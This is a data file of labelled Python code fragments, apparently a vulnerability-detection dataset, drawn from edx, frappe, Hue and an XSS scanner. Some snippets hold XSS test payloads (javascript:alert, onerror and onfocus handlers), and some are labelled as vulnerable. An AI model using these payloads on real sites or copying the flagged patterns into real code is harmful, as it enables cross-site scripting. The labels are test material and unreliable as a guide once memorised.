url(r'^(?i)university_profile/ANUx$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'ANUx'", "label": 0}, {"snippet_id": 3168, "code": ".find(decoded_payload) !=-1: impact=check_xss_impact(xss_post_request.headers) if db_update is not True: attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": xss_url, \"alert\": \"Cross Site Scripting\", \"impact", "label": 0}, {"snippet_id": 46539, "code": " JsonResponse(collections, safe=False) template='admin_collections.mako' if is_mobile: template='admin_collections_m.mako' return render(template, request,{ 'is_embeddable': request.GET.get('is_embeddable', False", "label": 0}, {"snippet_id": 15966, "code": " sh( 'tar zxf{zipped_course} -C{courses_dir}'.format( zipped_course=zipped_course, courses_dir=self.imports_dir, ) ) def generate_html_reports(self): \"\"\" Runs pa11ycrawler json-to-html \"\"\" cmd_str=( 'pa11ycrawler", "label": 0}, {"snippet_id": 49672, "code": " columns=[] for index, field in enumerate(self.list_display, start=1): kwargs={ 'model': self.model, 'column_id': index, 'query_params': self.query_params, 'ordering_query_param': self.ordering_query_param, ", "label": 0}, {"snippet_id": 33098, "code": " config as config_api from components import decorators from components import endpoints_webapp2 from components import prpc import webapp2 from legacy import api as legacy_api from legacy import swarmbucket_api", "label": 0}, {"snippet_id": 10578, "code": " CourseFixture, FixtureError from path import Path as path from paver.easy import sh, BuildFailure from pavelib.utils.test.suites.suite import TestSuite from pavelib.utils.envs import Env from pavelib.utils.test", "label": 0}, {"snippet_id": 11157, "code": " pressing Ctrl-C multiple times can corrupt noseid files and system state. Just press it once.\\n' while True: try: sleep(10000) except KeyboardInterrupt: print \"Stopping bok-choy servers.\\n\" break @property", "label": 0}, {"snippet_id": 35430, "code": "') \t\t\t\t\t\tor(_df.get('fetch_if_empty') and not self.get(_df.fieldname)) \t\t\t\t] \t\t\t\tif not fields_to_fetch: \t\t\t\t\t \t\t\t\t\tvalues=frappe._dict(name=frappe.db.get_value(doctype, docname, \t\t\t\t\t\t'name', cache=True", "label": 0}, {"snippet_id": 7122, "code": "'auth_password_reset_confirm'), url(r'^password_reset_complete/$', django.contrib.auth.views.password_reset_complete, name='auth_password_reset_complete'), url(r'^password_reset_done/$', django.contrib.auth.views", "label": 0}, {"snippet_id": 31201, "code": "=FileSystemLoader('templates/ajax')) \ttemplate=env.get_template('table_metrics.html') \t\t \tcookie=http.cookies.SimpleCookie(os.environ.get(\"HTTP_COOKIE\")) \tuser_id=cookie.get('uuid')\t \ttable_stat=sql.select_table_metrics", "label": 0}, {"snippet_id": 6698, "code": "\"\" URL(string) for use in simple templating of forbidden.html. \"\"\" return self.config.get(self.section, 'dashboard_link') @property def password_reset_link(self): \"\"\" URL(string) for use in simple templating", "label": 0}, {"snippet_id": 35462, "code": "')[-1] \t\t\t\t\t\tfor _df in fields_to_fetch] \t\t\t\t\t \t\t\t\t\tvalues=frappe.db.get_value(doctype, docname, \t\t\t\t\t\tvalues_to_fetch, as_dict=True) \t\t\t\tif frappe.get_meta(doctype).issingle: \t\t\t\t\tvalues.name=doctype ", "label": 0}, {"snippet_id": 43173, "code": "\treturn \t\tif self.meta.issingle: \t\t\t \t\t\treturn \t\tcolumn_types_to_check_length=('varchar', 'int', 'bigint') \t\tfor fieldname, value in iteritems(self.get_valid_dict()): \t\t\tdf=self.meta.get_field(fieldname) \t\t", "label": 0}, {"snippet_id": 7158, "code": "\"static_university_profile\", kwargs={'org_id': 'WellesleyX'}), url(r'^(?i)university_profile/McGillX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'McGillX'}), url(r'^", "label": 0}, {"snippet_id": 5907, "code": " payload): return '<style/onload=\"%s\"></style>' % payload def input(self, payload): return '<input/onfocus=\"%s\"/autofocus>' % payload def marquee(self, payload): return '<marquee/onstart=\"%s\"></marquee>", "label": 0}, {"snippet_id": 46450, "code": "=collection['label'] dashboard_doc.description=dashboard_doc1.description=collection['description'] dashboard_doc.save() dashboard_doc1.save() response['status']=0 response['id']=dashboard_doc.id response", "label": 0}, {"snippet_id": 3990, "code": "\": ref_header_xss.headers,\"res_body\": ref_header_xss.text} dbupdate.insert_record(attack_result) return def xss_get_url(url,method,headers,body,scanid=None): result='' xss_payloads=fetch_xss_payload() uri_check_list", "label": 0}, {"snippet_id": 43348, "code": " checked or fieldtype is 'Code' \t\t\"\"\" \t\tif frappe.flags.in_install: \t\t\treturn \t\tfor fieldname, value in self.get_valid_dict().items(): \t\t\tif not value or not isinstance(value, string_types): \t\t\t\tcontinue", "label": 0}, {"snippet_id": 10745, "code": "', 'tests') self.log_dir=Env.BOK_CHOY_LOG_DIR self.report_dir=kwargs.get('report_dir', Env.BOK_CHOY_REPORT_DIR) self.xunit_report=self.report_dir / \"xunit.xml\" self.cache=Env.BOK_CHOY_CACHE self.fasttest", "label": 0}, {"snippet_id": 35488, "code": "\t\tsetattr(self, df.fieldname, values.name) \t\t\t\t\tfor _df in fields_to_fetch: \t\t\t\t\t\tif self.is_new() or self.docstatus !=1 or _df.allow_on_submit: \t\t\t\t\t\t\tsetattr(self, _df.fieldname, values[_df.fetch_from", "label": 0}, {"snippet_id": 35909, "code": " in self.get_valid_dict().items(): \t\t\tif not value or not isinstance(value, string_types): \t\t\t\tcontinue \t\t\tvalue=frappe.as_unicode(value) \t\t\tif(u\"<\" not in value and u\">\" not in value): \t\t\t\t \t\t\t\tcontinue", "label": 0}, {"snippet_id": 8753, "code": "'EPFLx'}), url(r'^university_profile/(?P<org_id>[^/]+)$', 'courseware.views.university_profile', name=\"university_profile\"), ) urlpatterns +=( url(r'^404$', 'static_template_view.views.render', {'template", "label": 0}, {"snippet_id": 34840, "code": " is_new(self): \t\treturn self.get(\"__islocal\") \tdef as_dict(self, no_nulls=False, no_default_fields=False, convert_dates_to_str=False): \t\tdoc=self.get_valid_dict(convert_dates_to_str=convert_dates_to_str)", "label": 0}, {"snippet_id": 1788, "code": " import logger from utils.db import Database_update from utils.config import get_value dbupdate=Database_update() api_logger=logger() def fetch_xss_payload(): payload_list=[] if os.getcwd().split('/')[", "label": 0}, {"snippet_id": 17997, "code": " urlpatterns +=(url(r'^%s' % key.lower(), 'static_template_view.views.render', {'template': template}, name=value),) if settings.PERFSTATS: urlpatterns +=(url(r'^reprofile$', 'perfstats.views.end_profile')", "label": 0}, {"snippet_id": 8872, "code": "\"FAQ\": continue template=\"%s.html\" % key.lower() if settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: template=\"theme-\" +template urlpatterns +=(url(r'^%s' % key.lower(), 'static_template_view.views.render',", "label": 0}, {"snippet_id": 22743, "code": "'courseware.views.mktg_course_about', name=\"mktg_about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'courseware.views.course_info', name=\"course_root\"), url(r'^courses/(?P<course_id>[^/", "label": 0}, {"snippet_id": 51284, "code": "/settings.html' admin.site.unregister([Config]) admin.site.register([Config], ConfigAdmin) @admin.register(Account) class AccountAdmin(ImportExportModelAdmin, admin.ModelAdmin): list_display=('name', 'enable_logins", "label": 0}, {"snippet_id": 25903, "code": ".TYPE_DATETIME: field=SplitDateTimeField( label=q.question, required=q.required, help_text=help_text, initial=dateutil.parser.parse(initial.answer).astimezone(tz) if initial and initial.answer else None", "label": 0}, {"snippet_id": 35542, "code": " \"docstatus\"))==2): \t\t\t\t\t\tcancelled_links.append((df.fieldname, docname, get_msg(df, docname))) \t\treturn invalid_links, cancelled_links \tdef _validate_selects(self): \t\tif frappe.flags.in_import: \t\t\treturn", "label": 0}, {"snippet_id": 18783, "code": "'submission_history'), ) if settings.ENABLE_JASMINE: urlpatterns +=(url(r'^_jasmine/', include('django_jasmine.urls')),) if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'): urlpatterns +", "label": 0}, {"snippet_id": 4035, "code": ".api_request(parsed_url+'/'+payload,\"GET\",headers) if result is not True: decoded_payload=xss_payload_decode(payload) if xss_request_url.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_request_url", "label": 0}, {"snippet_id": 36367, "code": " \tdef reset_values_if_no_permlevel_access(self, has_access_to, high_permlevel_fields): \t\t\"\"\"If the user does not have permissions at permlevel > 0, then reset the values to original / default\"\"\" \t\tto_reset", "label": 0}, {"snippet_id": 19832, "code": " -when set, check for XSS vulnerabilities in the page HTML. See nosetest documentation: http://nose.readthedocs.org/en/latest/usage.html \"\"\" def __init__(self, *args, **kwargs): super(BokChoyTestSuite,", "label": 0}, {"snippet_id": 4274, "code": ",scanid): if method=='GET' or method=='DEL': xss_get_uri(url,method,headers,body,scanid) xss_get_url(url,method,headers,body,scanid) if method=='POST' or method=='PUT': xss_post_method(url,method,headers", "label": 0}, {"snippet_id": 32165, "code": " MappingsTable(tables.DataTable): id=tables.Column('id', verbose_name=_('Mapping ID')) description=tables.Column(get_rules_as_json, verbose_name=_('Rules')) class Meta(object): name=\"idp_mappings\" verbose_name", "label": 0}, {"snippet_id": 50908, "code": " constance.admin import Config, ConstanceAdmin, ConstanceForm from cryptography.fernet import Fernet from django.conf import settings from django.contrib import admin from django.contrib.auth.admin import", "label": 0}, {"snippet_id": 32052, "code": ":identity:mappings:create\" classes=(\"ajax-modal\",) icon=\"plus\" policy_rules=((\"identity\", \"identity:create_mapping\"),) class EditMappingLink(tables.LinkAction): name=\"edit\" verbose_name=_(\"Edit\") url=\"horizon", "label": 0}, {"snippet_id": 52236, "code": "(request): if request.method !='POST': raise PopupException(_('A POST request is required.')) jobs=json.loads(request.POST.get('selection')) for job in jobs: doc2=Document2.objects.get(type='oozie-workflow2", "label": 0}, {"snippet_id": 12686, "code": "/[^/]+/[^/]+)/submission_history/(?P<student_username>[^/]*)/(?P<location>.*?)$', 'courseware.views.submission_history', name='submission_history'), ) if settings.ENABLE_JASMINE: urlpatterns +=(url(r'^_jasmine", "label": 0}, {"snippet_id": 16552, "code": "'courseware.views.jump_to', name=\"jump_to\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)/(?P<dispatch>[^/]*)$', 'courseware.module_render.modx_dispatch', name='modx_dispatch'),", "label": 0}, {"snippet_id": 26198, "code": " event.settings.invoice_address_beneficiary: del self.fields['beneficiary'] def clean(self): data=self.cleaned_data if not data.get('is_business'): data['company']='' if self.event.settings.invoice_address_required", "label": 0}, {"snippet_id": 47107, "code": ", p: m.version_id-1, json=lambda v, c, m, p: Markup(\"<pre>{0}</pre>\".format( json.dumps(m.json, indent=2, sort_keys=True))) ) column_filters=('created', 'updated',) column_default_sort=('updated', True", "label": 1}, {"snippet_id": 47629, "code": "(1), minimum=0)) f.add_content(PlainText(\"Rights: \")) f.add_content(NumberField(name=\"rights\", button_text=str(0), minimum=0, maximum=4)) f.add_content(PlainText('Notes:<br/>')) f.add_content(TextArea(name", "label": 0}, {"snippet_id": 48841, "code": " return self.field_name.title() if callable(field) and getattr(field, 'short_description', False): return field.short_description return self.field_name.replace(\"_\", \" \").title() class QueryParamsMixin", "label": 0}, {"snippet_id": 19297, "code": "=spec, default_store='draft') name='tests/{}'.format(spec) self.assertEqual( suite.cmd, self._expected_command(name=name, store='draft') ) def test_invalid_default_store(self): suite=BokChoyTestSuite(''", "label": 0}, {"snippet_id": 38313, "code": ".content as content, \t\t\t\tifnull(t1.blog_intro, t1.content) as intro, \t\t\t\tt2.full_name, t2.avatar, t1.blogger, \t\t\t\t(select count(name) from `tabCommunication` \t\t\t\t\twhere \t\t\t\t\t\tcommunication_type='Comment'", "label": 0}, {"snippet_id": 50714, "code": ".sessionhandler.data_out(self, **kwargs) def send_text(self, *args, **kwargs): \"\"\" Send text data. This will pre-process the text for color-replacement, conversion to html etc. Args: text(str): Text to send", "label": 0}, {"snippet_id": 28200, "code": ", \"r\") \t\tconfig_read=conf.read() \t\tconf.close \texcept IOError: \t\terror +='<br />Can\\'t read import config file' \tos.system(\"/bin/mv %s %s.old\" %(cfg, cfg))\t if serv is not None and form.getvalue('config", "label": 0}, {"snippet_id": 49039, "code": " SmartListField(self, column, self.object) for column in self.smart_list.columns ] class SmartOrder(QueryParamsMixin, object): def __init__(self, query_params, column_id, ordering_query_param): self.query_params", "label": 0}, {"snippet_id": 20345, "code": "\"nosetests\", test_spec, \"{}\".format(self.verbosity_processes_string()) ] if self.pdb: cmd.append(\"--pdb\") if self.save_screenshots: cmd.append(\"--with-save-baseline\") cmd.append(self.extra_args) cmd=(\" ", "label": 0}, {"snippet_id": 54959, "code": ".aggregate_stats() def mark_changed_translation(changed_entities, locale): \"\"\"Mark entities as changed, for later sync. \"\"\" changed_entities_array=[] existing=( ChangedEntityLocale.objects .values_list('entity'", "label": 0}, {"snippet_id": 43171, "code": "\tif frappe.flags.in_install: \t\t\treturn \t\tif self.meta.issingle: \t\t\t \t\t\treturn \t\tcolumn_types_to_check_length=('varchar', 'int', 'bigint') \t\tfor fieldname, value in iteritems(self.get_valid_dict()): \t\t\tdf", "label": 0}, {"snippet_id": 21371, "code": "), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.html_index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/courseware", "label": 1}, {"snippet_id": 20323, "code": "(self.default_store), \"SCREENSHOT_DIR='{}'\".format(self.log_dir), \"BOK_CHOY_HAR_DIR='{}'\".format(self.har_dir), \"BOKCHOY_A11Y_CUSTOM_RULES_FILE='{}'\".format(self.a11y_file), \"SELENIUM_DRIVER_LOG_DIR='{}'", "label": 0}, {"snippet_id": 46077, "code": " query={'qs':[{'q': ''}], 'fqs':[], 'start': 0} if request.method=='GET': if 'q' in request.GET: query['qs'][0]['q']=request.GET.get('q') if 'qd' in request.GET: query['qd']=request.GET.get('qd') template=", "label": 1}, {"snippet_id": 37269, "code": "() \t\tif not self.blog_intro: \t\t\tself.blog_intro=self.content[:140] \t\t\tself.blog_intro=strip_html_tags(self.blog_intro) \t\tif self.blog_intro: \t\t\tself.blog_intro=self.blog_intro[:140] \t\tif self.published", "label": 0}, {"snippet_id": 44416, "code": " response={} request.info(_('Workflows deleted.') if len(jobs) > 1 else _('Workflow deleted.')) return HttpResponse(json.dumps(response), mimetype=\"application/json\") @check_document_access_permission() def", "label": 0}, {"snippet_id": 20296, "code": " This method composes the nosetests command to send to the terminal. If nosetests aren't being run, the command returns an empty string. \"\"\" if not self.test_spec: test_spec=self.test_dir else: test_spec", "label": 0}, {"snippet_id": 7932, "code": "'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts$', 'course_groups.views.list_cohorts', name=\"cohorts\"),", "label": 0}, {"snippet_id": 9311, "code": "<course_id>[^/]+/[^/]+/[^/]+)/progress$', 'courseware.views.progress', name=\"progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$', 'courseware.views.progress', name", "label": 0}, {"snippet_id": 11048, "code": " def load_courses(self): \"\"\" Loads courses from self.imports_dir. Note: self.imports_dir is the directory that contains the directories that have courses in them. For example, if the course is located in", "label": 0}, {"snippet_id": 8377, "code": " +=( url(r'^instructor_task_status/$', 'instructor_task.views.instructor_task_status', name='instructor_task_status'), ) if settings.MITX_FEATURES.get('RUN_AS_ANALYTICS_SERVER_ENABLED'): urlpatterns +=", "label": 0}, {"snippet_id": 3327, "code": "-1: print ref_header_xss.text impact=check_xss_impact(temp_headers) print \"%s[{0}]{1} is vulnerable to XSS via referer header%s\".format(impact,url)%(api_logger.G, api_logger.W) attack_result={ \"id\": 11,", "label": 0}, {"snippet_id": 42635, "code": ") \tdef _fix_numeric_types(self): \t\tfor df in self.meta.get(\"fields\"): \t\t\tif df.fieldtype==\"Check\": \t\t\t\tself.set(df.fieldname, cint(self.get(df.fieldname))) \t\t\telif self.get(df.fieldname) is not None: \t", "label": 0}, {"snippet_id": 42851, "code": ".fieldname)) \t\t\t\telse: \t\t\t\t\tdoctype=self.get(df.options) \t\t\t\t\tif not doctype: \t\t\t\t\t\tfrappe.throw(_(\"{0} must be set first\").format(self.meta.get_label(df.options))) \t\t\t\t \t\t\t\t \t\t\t\t \t\t\t\t \t\t\t\tfields_to_fetch=[", "label": 0}, {"snippet_id": 2956, "code": ".G, api_logger.W) if db_update is not True: attack_result={ \"id\": 11, \"scanid\": scanid, \"url\": xss_url, \"alert\": \"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers", "label": 0}, {"snippet_id": 31504, "code": "('waf_metrics'): \tfrom datetime import timedelta \tfrom bokeh.plotting import figure, output_file, show \tfrom bokeh.models import ColumnDataSource, HoverTool, DatetimeTickFormatter, DatePicker \tfrom bokeh", "label": 0}, {"snippet_id": 23414, "code": " url(r'^course_specific_login/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'external_auth.views.course_specific_login', name='course-specific-login'), url(r'^course_specific_register/(?P<course_id>[^/]+/[^/]+/", "label": 0}, {"snippet_id": 3197, "code": "\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) db_update=True vul_param +=key else: result=True if vul_param=='': post_vul_param +=key else: post_vul_param +=','+key if post_vul_param", "label": 0}, {"snippet_id": 8293, "code": " ) if settings.MITX_FEATURES.get('ENABLE_PEARSON_LOGIN', False): urlpatterns +=url(r'^testcenter/login$', 'external_auth.views.test_center_login'), if settings.MITX_FEATURES.get('ENABLE_LMS_MIGRATION')", "label": 0}, {"snippet_id": 20335, "code": ".format(self.a11y_file), \"SELENIUM_DRIVER_LOG_DIR='{}'\".format(self.log_dir), \"VERIFY_XSS='{}'\".format(self.verify_xss), \"nosetests\", test_spec, \"{}\".format(self.verbosity_processes_string()) ] if self", "label": 0}, {"snippet_id": 39334, "code": " \t\t\t\t({columns}) values({values})\"\"\".format( \t\t\t\t\tdoctype=self.doctype, \t\t\t\t\tcolumns=\", \".join([\"`\"+c+\"`\" for c in columns]), \t\t\t\t\tvalues=\", \".join([\"%s\"] * len(columns)) \t\t\t\t), list(d.values())) \t\texcept", "label": 0}, {"snippet_id": 41283, "code": ".update(frappe.get_doc(\"Blog Settings\", \"Blog Settings\").as_dict(no_default_fields=True)) \treturn list_context def get_children(): \treturn frappe.db.sql(\"\"\"select route as name, \t\ttitle from `tabBlog Category`", "label": 0}, {"snippet_id": 25505, "code": "(v for v in value)): raise forms.ValidationError(self.error_messages['required'], code='required') if self.require_all_fields and not all(v for v in value): raise forms.ValidationError(self.error_messages", "label": 0}, {"snippet_id": 19709, "code": " pavelib.utils.envs import Env from pavelib.utils.test import bokchoy_utils from pavelib.utils.test import utils as test_utils import os try: from pygments.console import colorize except ImportError: colorize", "label": 0}, {"snippet_id": 39545, "code": ".fieldname))) \t\t\telif self.get(df.fieldname) is not None: \t\t\t\tif df.fieldtype==\"Int\": \t\t\t\t\tself.set(df.fieldname, cint(self.get(df.fieldname))) \t\t\t\telif df.fieldtype in(\"Float\", \"Currency\", \"Percent\"): \t\t", "label": 0}, {"snippet_id": 14318, "code": "/[^/]+/[^/]+)/$', 'external_auth.views.course_specific_register', name='course-specific-register'), ) if settings.MITX_FEATURES.get('AUTH_USE_OPENID_PROVIDER'): urlpatterns +=( url(r'^openid/provider/login", "label": 0}, {"snippet_id": 19589, "code": " command to run pa11ycrawler. \"\"\" expected_statement=( 'pa11ycrawler run{start_urls} ' '--pa11ycrawler-allowed-domains=localhost ' '--pa11ycrawler-reports-dir={report_dir} ' '--pa11ycrawler-deny-url-matcher", "label": 0}, {"snippet_id": 18127, "code": "', name='xqueue_callback'), url(r'^change_setting$', 'student.views.change_setting', name='change_setting'), url(r'^calculate$', 'util.views.calculate'), url(r'^courses/?$', 'branding.views.courses', name", "label": 0}, {"snippet_id": 22982, "code": "<course_id>[^/]+/[^/]+/[^/]+)/progress$', 'courseware.views.progress', name=\"progress\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/progress/(?P<student_id>[^/]*)/$', 'courseware.views.progress', name", "label": 0}, {"snippet_id": 14289, "code": "'^shib-login/$', 'external_auth.views.shib_login', name='shib-login'), ) if settings.MITX_FEATURES.get('RESTRICT_ENROLL_BY_REG_METHOD'): urlpatterns +=( url(r'^course_specific_login/(?P<course_id>[^/]+/[^/]", "label": 0}, {"snippet_id": 44705, "code": " workflow.id } for workflow in[d.content_object for d in Document.objects.get_docs(user, Document2, extra='workflow2')] ] def add_node(request): response={'status': -1} node=json.loads(request.POST.get('node',", "label": 0}, {"snippet_id": 52158, "code": "(WORKFLOW_NODE_PROPERTIES), 'doc1_id': doc.doc.get().id if doc else -1, 'subworkflows_json': json.dumps(_get_workflows(request.user)), 'can_edit_json': json.dumps(doc is None or doc.doc.get().is_editable(request.user)) ", "label": 1}, {"snippet_id": 51887, "code": "'DEBUG'), }, }, } CELERY_accept_content=['pickle', 'yaml'] CELERY_task_serializer='pickle' CELERY_result_serializer='pickle' CELERY_BROKER_URL=os.environ.get('BROKER', 'redis://localhost:6379/0') ENABLE_UTC", "label": 0}, {"snippet_id": 9420, "code": "/get_problem_list$', 'open_ended_grading.staff_grading_service.get_problem_list', name='staff_grading_get_problem_list'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_problems$', 'open_ended_grading", "label": 0}, {"snippet_id": 52833, "code": ":editor_submit_workflow', kwargs={'doc_id': workflow.id}) }, force_template=True).content return HttpResponse(json.dumps(popup), mimetype=\"application/json\") def _submit_workflow(user, fs, jt, workflow", "label": 0}, {"snippet_id": 5932, "code": " payload): return '<div/onwheel=\"%s\"/style=\"height:200%;width:100%\"></div>' % payload def script(self): payload=\"<script src='%s'></script>\" % self.url return payload def event(self, element, src, event", "label": 0}, {"snippet_id": 35250, "code": "\"Table\": \t\t\t\treturn \"{}:{}:{}\".format(_(\"Error\"), _(\"Data missing in table\"), _(df.label)) \t\t\telif self.parentfield: \t\t\t\treturn \"{}:{}{} \t\t\t\t\t_(\"Row\"), self.idx, _(\"Value missing for\"), _(df.label)) \t\t", "label": 0}, {"snippet_id": 2653, "code": "\"Cross Site Scripting\", \"impact\": impact, \"req_headers\": headers, \"req_body\":body, \"res_headers\": host_header_xss.headers,\"res_body\": host_header_xss.text} dbupdate.insert_record(attack_result) break for", "label": 0}, {"snippet_id": 46610, "code": ".urls import reverse from.entryform import EntryForm, entry_form_config, build_question_flag from.models import LifeCondition, Benefit, BenefitRequirement class BenefitOverview(TemplateView): template_name", "label": 0}, {"snippet_id": 24847, "code": " servers.\\n\" break @property def cmd(self): \"\"\" This method composes the nosetests command to send to the terminal. If nosetests aren't being run, the command returns an empty string. \"\"\" if not self.test_spec", "label": 0}, {"snippet_id": 45262, "code": "=Document2.objects.get(id=coordinator_data['id']) else: coordinator_doc=Document2.objects.create(name=coordinator_data['name'], uuid=coordinator_data['uuid'], type='oozie-coordinator2', owner=request.user", "label": 0}, {"snippet_id": 10098, "code": ".setUp() self.shard=os.environ.get('SHARD') self.env_var_override=EnvironmentVarGuard() def test_default(self): suite=BokChoyTestSuite('') name='tests' self.assertEqual(suite.cmd, self._expected_command", "label": 0}, {"snippet_id": 29190, "code": ", print_out=\"1\") \tif stderr is None: \t\tsql.insert_waf_metrics_enable(serv, \"0\") def check_haproxy_version(serv): \timport sql \thaproxy_sock_port=sql.get_setting('haproxy_sock_port') \tver=\"\" \tcmd=\"echo 'show", "label": 0}, {"snippet_id": 31378, "code": "\t\ttools=\"pan,box_zoom,reset,xwheel_zoom\",\t\t \t\t\ttitle=metric[0][0], \t\t\tx_axis_type=\"datetime\", y_axis_label='Connections', \t\t\tx_range=(x_max.timestamp()*1000-60*100000, x_max.timestamp()*1000) \t\t\t) \t\t\t ", "label": 0}, {"snippet_id": 20940, "code": "-kit$', 'static_template_view.views.render', {'template': 'media-kit.html'}, name=\"media-kit\"), url(r'^faq$', 'static_template_view.views.render', {'template': 'faq.html'}, name=\"faq_edx\"), url(r'^help$'", "label": 0}, {"snippet_id": 5229, "code": " payload=\"<script src='%s'></script>\" % self.url return payload def event(self, element, src, event, js): payload=\"<%s src=\" % element payload +='\"%s\" ' % src payload +=event payload +=\"=%s >\" % js return", "label": 0}, {"snippet_id": 26079, "code": "' in f.widget.attrs: del f.widget.attrs['required'] elif event.settings.invoice_address_company_required and not self.all_optional: self.initial['is_business']=True self.fields['is_business'].widget=BusinessBooleanRadio", "label": 0}, {"snippet_id": 13316, "code": " 'courseware.views.university_profile', name=\"university_profile\"), ) urlpatterns +=( url(r'^404$', 'static_template_view.views.render', {'template': '404.html'}, name=\"404\"), ) if not settings.MITX_FEATURES", "label": 0}, {"snippet_id": 47315, "code": "=client.get(detail_view_url) assert res.status_code==200 assert '<pre>null</pre>' in res.get_data(as_text=True) res=client.post( delete_view_url, data={'id': rec_uuid}, follow_redirects=True) assert res", "label": 0}, {"snippet_id": 26946, "code": "(\"get\")==0: r=requests.get(url=furl, params=post_params) else: r=requests.post(furl, data=post_params) if DEBUG==1: print post_params with open(\"response_\" +str(form_counter) +\"_\" +str(counter) +\".html", "label": 0}, {"snippet_id": 28440, "code": "=\"%b %d %H:%M:%S\" \t\t \treturn now_utc.strftime(fmt) \t\t\t def logging(serv, action, **kwargs): \timport sql \timport http.cookies \tlog_path=get_config_var('main', 'log_path') \tlogin='' \t \tif not os.path.exists", "label": 0}, {"snippet_id": 687, "code": ",scanid=None): db_update='' vul_param='' url_query=urlparse.urlparse(url) parsed_query=urlparse.parse_qs(url_query.query) if parsed_query: for key,value in parsed_query.items(): try: result='' logs.logging", "label": 0}, {"snippet_id": 9494, "code": "<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)$', 'course_groups.views.users_in_cohort', name=\"list_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$", "label": 0}, {"snippet_id": 4181, "code": "=xss_payload_decode(payload) print decoded_payload print xss_url if xss_request.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_request.headers) logs.logging.info(\"%s is vulnerable to XSS\",url)", "label": 0}, {"snippet_id": 25509, "code": " raise forms.ValidationError(self.error_messages['required'], code='required') if self.require_all_fields and not all(v for v in value): raise forms.ValidationError(self.error_messages['incomplete'], code=", "label": 0}, {"snippet_id": 5786, "code": " formaction=\"javascript:alert(1)\">X</button>', '<math href=\"javascript:alert(1)\">CLICKME</math>', '<link rel=\"import\" href=\"test.svg\" />', '<iframe srcdoc=\"&lt;img src&equals;x:x onerror&equals;alert&lpar", "label": 0}, {"snippet_id": 47185, "code": " invenio_records.api import Record def test_admin(app, db): \"\"\"Test flask-admin interace.\"\"\" admin=Admin(app, name=\"Test\") assert 'model' in record_adminview assert 'modelview' in record_adminview model", "label": 0}, {"snippet_id": 54413, "code": "(main, text='Quit', command=main.destroy).grid(row=11, column=0, sticky=W, pady=4) Button(main, text='Stop', command=kill).grid(row=11, column=2, sticky=W, pady=4) Button(main, text='Scan', command=scan", "label": 0}, {"snippet_id": 42750, "code": ") in(None,[]) or not strip_html(cstr(self.get(df.fieldname))).strip(): \t\t\t\tmissing.append((df.fieldname, get_msg(df))) \t\t \t\tif self.meta.istable: \t\t\tfor fieldname in(\"parent\", \"parenttype\"): \t\t\t\tif not", "label": 0}, {"snippet_id": 19430, "code": ".verbosity_processes_string(suite), expected_verbosity_string) def test_verbosity_settings_2_processes(self): \"\"\" Using multiple processes means specific xunit, coloring, and process-related settings should be used. \"", "label": 0}, {"snippet_id": 49190, "code": "() def get_remove_sort_by(self): new_query=[] for column in self.query_order.split('.'): c=column.replace(\"-\", \"\") if not int(c)==self.column_id: new_query.append(column) return self.get_url_with_query_params", "label": 0}, {"snippet_id": 27297, "code": "\n \"\"\"The superclass of all handlers.\"\"\" from builtins import object from future import standard_library standard_library.install_aliases() import base64 import cgi import datetime import json import logging", "label": 0}, {"snippet_id": 14574, "code": " _expected_command(self, name, store=None, verify_xss=False): \"\"\" Returns the command that is expected to be run for the given test spec and store. \"\"\" expected_statement=( \"DEFAULT_STORE={default_store}", "label": 1}, {"snippet_id": 23966, "code": "-with-xunit --xunit-file={repo_dir}/reports/bok_choy{shard_str}/xunit.xml --verbosity=2\".format( repo_dir=REPO_DIR, shard_str='/shard_' +self.shard if self.shard else '' ) ) suite=BokChoyTestSuite('', num_processes", "label": 0}, {"snippet_id": 31617, "code": "\t\t\t(\"Connections\", \"@conn\"), \t\t\t], \t\t\tmode='mouse' \t\t) \t\t \t\tp[serv].ygrid.band_fill_color=\" \t\tp[serv].ygrid.band_fill_alpha=0.9 \t\tp[serv].y_range.start=0 \t\tp[serv].y_range.end=int(df['conn'].max()) +150", "label": 0}, {"snippet_id": 6141, "code": "._parsed_content_packages=None self._parsed_status_test_usernames=None self.section=_CONFIG_SECTION _CONFIG_DEFAULTS['debug']=str(debug) cfgdir=os.path.dirname(filename) _CONFIG_DEFAULTS['pysaml2_config']=os.path.join(cfgdir,", "label": 0}, {"snippet_id": 48944, "code": "(field, 'do_not_call_in_templates', False) else field else: display_function=getattr(self.object, 'get_%s_display' % self.column.field_name, False) value=display_function() if display_function else field", "label": 0}, {"snippet_id": 17882, "code": "'static_template_view.views.render', {'template': '404.html'}, name=\"404\"), ) if not settings.MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns +=( url(r'^jobs$', 'static_template_view.views.render', {'template':", "label": 0}, {"snippet_id": 23736, "code": "{shard_str}/xunit.xml \" \"--verbosity=2 \" ).format( default_store=store, repo_dir=REPO_DIR, shard_str='/shard_' +self.shard if self.shard else '', exp_text=name, a11y_custom_file='node_modules/edx-custom", "label": 0}, {"snippet_id": 30863, "code": " 